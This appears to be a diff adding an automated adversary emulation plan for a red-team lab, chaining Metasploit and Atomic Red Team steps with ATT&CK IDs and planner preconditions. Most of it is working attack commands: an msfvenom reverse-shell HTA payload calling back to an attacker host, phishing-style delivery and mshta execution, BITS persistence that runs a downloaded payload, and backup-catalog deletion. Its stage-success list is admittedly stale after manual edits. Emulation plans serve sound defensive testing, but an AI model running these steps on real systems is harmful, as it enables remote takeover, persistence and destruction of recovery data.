@@ -1,0 +1,479 @@
+emulation_plan_details:
+  adversary_name: env0
+  creation_time: 2026-07-13 17:10:17 UTC+0000
+  parent_chain_idx: 76
+  internal_chain_idx: 84
+  stage_outcomes:
+  - stage: initial-executor
+    status: succeeded
+    plan_source: attack_plan-5.yml
+  - stage: discovery-obtained
+    status: succeeded
+    plan_source: attack_plan-1.yml
+  - stage: credential-access-obtained
+    status: succeeded
+    plan_source: attack_plan-1.yml
+  - stage: persistence-obtained
+    status: succeeded
+    plan_source: attack_plan-1.yml
+  - stage: privilege-escalation-obtained
+    status: succeeded
+    plan_source: attack_plan-1.yml
+  - stage: collection-obtained
+    status: succeeded
+    plan_source: attack_plan-1.yml
+  - stage: exfiltration-obtained
+    status: succeeded
+    plan_source: attack_plan-1.yml
+  - stage: impact-obtained
+    status: succeeded
+    plan_source: attack_plan-2.yml
+  - stage: lateral-movement-obtained
+    status: succeeded
+    plan_source: attack_plan-1.yml
+  manual_edits:
+    edited_at: '2026-07-14'
+    removed_steps_1based:
+    - 10
+    - 11
+    original_step_count: 13
+    step_count_after_edit: 11
+    reason: Step 10 (art-t1003_002-esentutl-vss-sam-copy) VSS-broken on env0; Step 11 (meterpreter-download) only existed to fetch Step 10's output.
+    note: stage_outcomes above reflects the original planner state, NOT the executable state of this -fixed chain. Removed cred-access step(s) mean credential-access-obtained and any tactic stages that inherited from it are no longer supported by this chain's atomic sequence.
+attack_action_sequence:
+- uuid: msfvenom-hta
+  name: Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using MSFVenom
+  id:
+  - T1218.005
+  - T1071.001
+  source: Manual
+  supported_platforms:
+  - windows
+  tactics:
+  - Defense Evasion
+  - Command and Control
+  technique:
+  - 'System Binary Proxy Execution: Mshta'
+  - 'Application Layer Protocol: Web Protocols'
+  description: |
+    The command uses MSFVenom to generate an HTA (HTML Application) payload for a Meterpreter session. HTA files are opened by the Windows built-in `mshta.exe`, letting the payload run via a signed Microsoft binary (LOLBAS-style delivery). The `hta-psh` format wraps a PowerShell stager inside the HTA.
+  execution:
+    executor: MSFVenom Console
+    command: |
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} -f hta-psh -o #{SAVE_PATH}
+  arguments:
+    LHOST:
+      default:
+      description: IP address of the attacker machine
+      required: true
+    LPORT:
+      default:
+      description: listening port of the attacker machine
+      required: true
+    SAVE_PATH:
+      default:
+      description: Saved path of the generated payload
+      required: true
+      pddl_index: string3_var_in_plan
+  preconditions:
+  - (os-windows ?target - host)
+  effects:
+  - (meterpreter-payload ?p - payload ?target - host)
+  - (file-payload ?p - payload ?file - file)
+  - (file-on-attacker ?path - string ?file - file)
+  - (hta-file ?file - file)
+- uuid: simulate-download-file
+  name: Simulate the victim download a file on its machine
+  id:
+  - T1566.002
+  source: Manual
+  supported_platforms:
+  - windows
+  tactics:
+  - Initial Access
+  technique:
+  - 'Phishing: Spearphishing Link'
+  description: This step simulates the victim accidentally downloads a malicious file by clicking a link.
+  execution:
+    executor: Human
+    command: |
+      (This step needs human interaction and (temporarily) cannot be executed automatically)
+      (On attacker's machine)
+      python -m http.server #{LPORT}
+
+      (On victim's machine)
+      1. Open #{LHOST}:#{LPORT} in the browser
+      2. Navigate to the path of the file on the attacker's machine
+      3. Download the file to #{SAVE_PATH}
+  arguments:
+    LHOST:
+      default:
+      description: IP address of the http file server (typically the attacker machine)
+      type:
+      required: true
+    LPORT:
+      default: 8000
+      description: port of the http file server
+      type:
+      required: true
+    SAVE_PATH:
+      default:
+      description: Saved path of the downloaded payload
+      required: true
+      pddl_index: string4_var_in_plan
+  preconditions:
+  - (allow-simulate-user-action ?target - host)
+  - operator: or
+    operands:
+    - (os-linux ?target - host)
+    - (os-windows ?target - host)
+    - (os-macos ?target - host)
+  - (file-on-attacker ?localpath - string ?file - file)
+  effects:
+  - (file-exists ?path - string ?file - file ?target - host)
+- uuid: set-msf-payload-handler-for-file
+  name: Set an MSF payload handler for a file-backed payload
+  id:
+  - T1071.001
+  source: Manual
+  supported_platforms:
+  - windows
+  tactics:
+  - Execution
+  - Command and Control
+  technique:
+  - Windows Command Shell
+  - Ingress Tool Transfer
+  - Non-Standard Por
+  description: |
+    Same MSF `exploit/multi/handler` mechanism as `set-msf-payload-handler`, but
+    for the case where the meterpreter payload has been (or will be) staged as a
+    file on the victim.
+
+    This variant additionally grants `(callback-covered ?file)` for the payload's
+    file — the gate that every execute-* action requires before running that file.
+    Payload-genesis actions (msfvenom) deliberately do NOT produce
+    `callback-covered`, so payload files are born uncovered; firing this action
+    is what makes them safe to execute. This forces the planner to sequence
+    handler-set before any execute-* on the payload file — the ordering
+    constraint is encoded directly in PDDL preconditions.
+
+    Use `set-msf-payload-handler` (no file) for fileless delivery: reflective
+    loading, in-memory shellcode injection, staged callback with no on-disk
+    artifact.
+  execution:
+    executor: Metasploit Executor
+    command: |
+      exploit_and_execute_payload(exploit_module_name = "exploit/multi/handler",
+                                  payload_module_name = "#{payload_name}",
+                                  listening_host = "#{LHOST}",
+                                  listening_port = "#{LPORT}"):
+  arguments:
+    LHOST:
+      default:
+      description: IP address of the attacker machine
+      type:
+    LPORT:
+      default:
+      description: listening port of the attacter machine
+      type:
+    payload_name:
+      default:
+      description: payload type set by msf
+      type:
+  preconditions:
+  - (meterpreter-payload ?p - payload ?target - host)
+  - (file-payload ?p - payload ?file - file)
+  effects:
+  - (payload-handler-set ?p - payload)
+  - (callback-covered ?file - file)
+- uuid: simulate-execute-hta-windows
+  name: Simulate the victim execute an HTA file on its machine
+  id:
+  - T1218.005
+  - T1204.002
+  source: Manual
+  supported_platforms:
+  - windows
+  tactics:
+  - Defense Evasion
+  - Execution
+  technique:
+  - 'System Binary Proxy Execution: Mshta'
+  - 'User Execution: Malicious File'
+  description: |
+    This step simulates the victim opening an HTA (HTML Application) file via the Windows built-in `mshta.exe`. Because `mshta.exe` is a signed Microsoft binary trusted by many application-allow-listing policies, the HTA vehicle is a classic LOLBAS execution path (T1218.005).
+  execution:
+    executor: Human
+    command: |
+      (This step needs human interaction and (temporarily) cannot be executed automatically)
+      (On victim's machine, use PowerShell or Command Prompt, or the Run dialog)
+      mshta.exe #{HTA_PATH}
+  arguments:
+    HTA_PATH:
+      default:
+      description: Saved path of the HTA file on the victim machine
+      required: true
+      pddl_index: string4_var_in_plan
+  preconditions:
+  - (allow-simulate-user-action ?target - host)
+  - (os-windows ?target - host)
+  - (file-exists ?path - string ?file - file ?target - host)
+  - (hta-file ?file - file)
+  - (callback-covered ?file - file)
+  effects:
+  - (file-executed ?file - file ?target - host)
+- uuid: execute-meterpreter-payload-file
+  name: Execute a Meterpreter Payload
+  id:
+  - T1071.001
+  source: Meterpreter
+  supported_platforms:
+  - windows
+  tactics:
+  - Command and Control
+  technique:
+  - Application Layer Protocol - Web Protocols
+  description: |
+    Executing a Meterpreter payload will establish a Meterpreter session.
+  execution:
+    executor: Meterpreter Session Establish
+    command: |
+      None
+  arguments:
+  preconditions:
+  - (meterpreter-payload ?p - payload ?target - host)
+  - (file-payload ?p - payload ?f - file)
+  - (file-executed ?f - file ?target - host)
+  - (payload-handler-set ?p - payload)
+  effects:
+  - (meterpreter-session ?s - executor ?target - host)
+  - operator: When
+    params:
+      condition: (file-executed-elevated ?f - file ?target - host)
+      effect: (elevated-executor ?s - executor)
+- uuid: meterpreter-netstat
+  name: Network Connection Enumeration
+  id:
+  - T1049
+  source: Metasploit
+  supported_platforms:
+  - windows
+  - linux
+  tactics:
+  - Discovery
+  technique:
+  - System Network Connections Discovery
+  description: The `netstat` command enumerates active network connections on the remote system.
+  execution:
+    executor: Meterpreter Executor
+    command: netstat(meterpreter_sessionid=#{executor})
+  arguments:
+    executor:
+      description: The Meterpreter session ID of the active Metasploit connection.
+      required: true
+      pddl_index: executor4_var_in_plan
+  preconditions:
+  - operator: or
+    operands:
+    - (os-windows ?target - host)
+    - (os-linux ?target - host)
+  - (meterpreter-session ?executorID - executor ?target - host)
+  effects:
+  - (system-network-connections-info-known ?target - host)
+- uuid: simulate-execute-hta-windows-root
+  name: Simulate the victim execute an HTA file on its machine as Admin
+  id:
+  - T1218.005
+  - T1204.002
+  source: Manual
+  supported_platforms:
+  - windows
+  tactics:
+  - Defense Evasion
+  - Execution
+  technique:
+  - 'System Binary Proxy Execution: Mshta'
+  - 'User Execution: Malicious File'
+  description: |
+    This step simulates the victim opening an HTA (HTML Application) file via `mshta.exe` **as Administrator** — either from an elevated Command Prompt / PowerShell, or by right-clicking `mshta.exe` and selecting "Run as administrator" and passing the HTA path. Because `mshta.exe` is a signed Microsoft binary, this is a LOLBAS-style elevated execution path (T1218.005).
+  execution:
+    executor: Human
+    command: |
+      (This step needs human interaction and (temporarily) cannot be executed automatically)
+      (On victim's machine, open an ELEVATED PowerShell or Command Prompt)
+      mshta.exe #{HTA_PATH}
+  arguments:
+    HTA_PATH:
+      default:
+      description: Saved path of the HTA file on the victim machine
+      required: true
+      pddl_index: string4_var_in_plan
+  preconditions:
+  - (allow-simulate-user-action ?target - host)
+  - (os-windows ?target - host)
+  - (file-exists ?path - string ?file - file ?target - host)
+  - (hta-file ?file - file)
+  - (callback-covered ?file - file)
+  effects:
+  - (file-executed-elevated ?file - file ?target - host)
+- uuid: execute-meterpreter-payload-file
+  name: Execute a Meterpreter Payload
+  id:
+  - T1071.001
+  source: Meterpreter
+  supported_platforms:
+  - windows
+  tactics:
+  - Command and Control
+  technique:
+  - Application Layer Protocol - Web Protocols
+  description: |
+    Executing a Meterpreter payload will establish a Meterpreter session.
+  execution:
+    executor: Meterpreter Session Establish
+    command: |
+      None
+  arguments:
+  preconditions:
+  - (meterpreter-payload ?p - payload ?target - host)
+  - (file-payload ?p - payload ?f - file)
+  - (file-executed ?f - file ?target - host)
+  - (payload-handler-set ?p - payload)
+  effects:
+  - (meterpreter-session ?s - executor ?target - host)
+  - operator: When
+    params:
+      condition: (file-executed-elevated ?f - file ?target - host)
+      effect: (elevated-executor ?s - executor)
+- uuid: meterpreter-execute
+  name: Execute System Command
+  id:
+  - T1059
+  source: Metasploit
+  supported_platforms:
+  - windows
+  - linux
+  tactics:
+  - Execution
+  technique:
+  - Command and Scripting Interpreter
+  description: The `execute` command runs a system command on the remote target via the meterpreter session.
+  execution:
+    executor: Meterpreter Session Derive
+    command: |
+      # no-op — derivation only
+  arguments:
+    executor:
+      description: The Meterpreter session ID of the active Metasploit connection.
+      required: true
+      pddl_index: executor0_var_in_plan
+    executor_parent:
+      description: Parent meterpreter session ID
+      required: true
+      pddl_index: executor0_var_in_plan
+    Commands:
+      description: Command line to execute on the remote host
+      required: true
+    executor_derived:
+      description: The derived command-shell executor.
+      required: true
+      pddl_index: executor1_var_in_plan
+  preconditions:
+  - operator: or
+    operands:
+    - (os-windows ?target - host)
+    - (os-linux ?target - host)
+  - (meterpreter-session ?executorID - executor ?target - host)
+  effects:
+  - (command-prompt ?s2 - executor ?target - host)
+  - operator: When
+    params:
+      condition: (elevated-executor ?executorID - executor)
+      effect: (elevated-executor ?s2 - executor)
+- uuid: art-t1197-bits-notifycmdline
+  name: Persist, Download, & Execute
+  id:
+  - T1197
+  source: Atomic Red Team
+  supported_platforms:
+  - windows
+  tactics:
+  - Persistence
+  - Defense Evasion
+  technique:
+  - BITS Jobs
+  description: |
+    Abuses BITS `/setnotifycmdline` to trigger a command whenever the
+    BITS transfer state changes — the transfer is used as a persistence
+    vehicle (the notify command fires under the BITS service context).
+    Original ART hardcodes notepad.exe as the notify command; parameterised.
+    ART auto_generated_guid 62a06ec5-5754-47d2-bcfc-123d8314c6ae.
+  execution:
+    executor: Command Prompt Executor
+    command: |
+      bitsadmin.exe /create "#{bits_job_name}"
+      bitsadmin.exe /addfile "#{bits_job_name}" "#{remote_file}" "#{local_file}"
+      bitsadmin.exe /setnotifycmdline "#{bits_job_name}" "#{command_path}" NULL
+      bitsadmin.exe /resume "#{bits_job_name}"
+      ping -n 5 127.0.0.1 >nul 2>&1
+      bitsadmin.exe /complete "#{bits_job_name}"
+  arguments:
+    executor:
+      description: The Command Prompt session ID used to invoke bitsadmin.
+      required: true
+      pddl_index: executor1_var_in_plan
+    bits_job_name:
+      default: AtomicBITS
+      description: BITS job name.
+      required: true
+    remote_file:
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+      description: URL of a file for BITS to download (payload delivery vehicle).
+      required: true
+    local_file:
+      default: C:\Users\Public\bits_download.dat
+      description: Target-side destination for the BITS download.
+      required: true
+    command_path:
+      default: C:\Users\Public\payload.exe
+      description: Command invoked via `/setnotifycmdline` on BITS state change.
+      required: true
+      pddl_index: string1_var_in_plan
+  preconditions:
+  - (os-windows ?target - host)
+  - (command-prompt ?executorID - executor ?target - host)
+  effects:
+  - (command-execution-at-event ?c - string ?target - host)
+- uuid: art-t1490-wbadmin-delete-catalog
+  name: Windows - wbadmin Delete Windows Backup Catalog
+  id:
+  - T1490
+  source: Atomic Red Team
+  supported_platforms:
+  - windows
+  tactics:
+  - Impact
+  technique:
+  - Inhibit System Recovery
+  description: |
+    `wbadmin delete catalog -quiet` wipes the Windows Backup Catalog,
+    preventing the built-in Backup and Restore utility from restoring
+    from prior backup images. Complements shadow-copy deletion for a
+    full "no rollback" impact posture. ART auto_generated_guid
+    263ba6cb-ea2b-41c9-9d4e-b652dadd002c.
+  execution:
+    executor: Command Prompt Executor
+    command: |
+      wbadmin delete catalog -quiet
+  arguments:
+    executor:
+      description: The Command Prompt session ID used to invoke wbadmin.
+      required: true
+      pddl_index: executor1_var_in_plan
+  preconditions:
+  - (os-windows ?target - host)
+  - (command-prompt ?executorID - executor ?target - host)
+  - (elevated-executor ?executorID - executor)
+  effects:
+  - (inhibit-system-recovery ?target - host)
